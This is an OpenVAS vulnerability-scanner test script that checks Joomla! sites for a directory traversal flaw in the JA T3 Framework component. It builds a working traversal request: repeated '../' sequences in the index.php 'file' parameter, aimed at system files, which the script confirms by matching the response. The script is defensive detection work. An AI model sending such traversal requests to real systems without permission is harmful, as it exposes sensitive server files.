##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_joomla_ja_t3_framework_com_dir_trav_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Joomla! JA T3 Framework Component Directory Traversal Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to read arbitrary files via
  directory traversal attacks and gain sensitive information.
  Impact Level: Application";
tag_affected = "Joomla! JA T3 Framework Component";
tag_insight = "The flaw is due to an improper validation of user supplied input passed
  in 'file' parameter to the 'index.php', which allows attackers to read
  arbitrary files via a ../(dot dot) sequences.";
tag_solution = "No solution or patch is available as of 25th April, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://extensions.joomla.org/extensions/";
tag_summary = "This host is running Joomla! JA T3 Framework component and is
  prone to directory traversal vulnerability.";

if(description)
{
  script_id(902672);
  script_version("$Revision: 12 $");
  script_bugtraq_id(53039);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-04-25 17:38:13 +0530 (Wed, 25 Apr 2012)");
  script_name("Joomla! JA T3 Framework Component Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/81180");
  script_xref(name : "URL" , value : "http://1337day.com/exploits/18065");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/74909");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/111906/Joomla-JA-T3-Framework-Directory-Traversal.html");

  script_description(desc);
  script_summary("Check if Joomla! JA T3 Framework is vulnerable to directory traversal");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Variable Initialization
joomlaPort = 0;
joomlaDir = "";
url = "";

## Get HTTP Port
joomlaPort = get_http_port(default:80);
if(!joomlaPort){
  exit(0);
}

## Get the application directory
if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

## traversal_files() function Returns Dictionary (i.e key value pair)
## Get Content to be checked and file to be check
files = traversal_files();

foreach file (keys(files))
{
  ## Construct directory traversal attack
  url = string(joomlaDir, "/index.php?file=", crap(data:"../",length:3*15),
               files[file],"&jat3action=gzip&type=css&v=1");

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:joomlaPort, url:url, pattern:file, check_header:TRUE))
  {
    security_warning(joomlaPort);
    exit(0);
  }
}
